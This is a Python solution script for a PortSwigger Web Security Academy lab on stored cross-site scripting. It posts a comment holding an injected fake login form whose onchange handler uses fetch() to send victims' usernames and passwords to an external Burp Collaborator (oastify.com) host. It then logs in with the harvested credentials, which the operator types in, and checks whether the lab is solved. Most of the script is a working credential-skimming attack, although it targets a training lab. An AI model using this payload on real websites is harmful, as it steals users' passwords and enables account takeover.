import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
from string import Template

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
# author: 0xyf


class XSS23:
    def __init__(self):
        self.lab_id = "0a6e00d50404420682ce616200000044"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.post_id = 5
        self.csrf_url = f"{self.url}/post?postId={self.post_id}"
        self.vuln_url = f"{self.url}/post/comment"
        self.collab_url = f"https://r912u17ii1ioipcvcg0m7jhtckig679vy.oastify.com"
        self.login_url = f"{self.url}/login"

    def get_csrf_token(self):
        r = requests.get(f"{self.csrf_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def execute_request(self, data):
        r = requests.post(
            f"{self.vuln_url}",
            data=data,
            proxies=self.proxies,
            cookies=self.cookies,
            verify=False,
        )
        return r

    def stored_xss(self):
        self.get_csrf_token()
        payload = Template(
            """
        <input name=username id=username>
        <input type=password name=password onchange="if(this.value.length)fetch('$collab_url',{
        method:'POST',
        mode: 'no-cors',
        body:username.value+':'+this.value
        });">
        """
        )
        payload = payload.substitute(collab_url=self.collab_url)
        data = {
            "csrf": self.csrf_token,
            "postId": self.post_id,
            "comment": payload,
            "name": "0xyf",
            "email": "0xyf@0xyf.local",
            "website": f"https://yufongg.github.io",
        }
        r = self.execute_request(data)

    def login(self):
        self.get_csrf_token()
        self.username, self.password = input("enter creds <user:password>: ").split(":")
        print(f"[*] Attempting to Login as {self.username}:{self.password}")
        data = {
            "username": self.username,
            "password": self.password,
            "csrf": self.csrf_token,
        }
        requests.post(
            self.login_url,
            cookies=self.cookies,
            data=data,
            proxies=self.proxies,
            verify=False,
        )

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.stored_xss()
        self.login()
        self.check_solved()


def main():
    XSS23().solve()


if __name__ == "__main__":
    main()
